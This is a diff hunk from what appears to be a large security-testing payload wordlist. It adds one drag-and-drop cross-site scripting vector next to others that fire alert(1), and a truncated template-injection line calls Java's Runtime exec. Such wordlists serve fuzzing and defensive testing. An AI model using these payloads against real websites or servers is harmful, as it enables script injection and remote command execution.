@@ -44758,6 +44758,7 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 <div draggable="true" contenteditable>drag me</div><xmp ondragover=alert(1) contenteditable>drop here</xmp>
 <div draggable="true" contenteditable>drag me</div><xmp ondrop=alert(1) contenteditable style=display:block>drop here</xmp>
 <div draggable="true" contenteditable>drag me</div><xmp ondrop=alert(1) contenteditable>drop here</xmp>
+<div draggable="true" ondragstart="event.datatransfer.setdata('text/plain','malicious code');"> <h1>drop me</h1></div><iframe src="http://www.example.org/drophere.html"></iframe>
 <div draggable="true" ondragstart="event.datatransfer.setdata('text/plain','malicious code');"><h1>drop me</h1></div><iframe src="http://www.example.org/drophere.html"></iframe>
 <div id="118"><div draggable="true" ondragstart="event.datatransfer.setdata('text/plain','malicious code');"><h1>drop me</h1></div>
 <div id="131"><b>drag and drop one of the following strings to the drop box:</b>
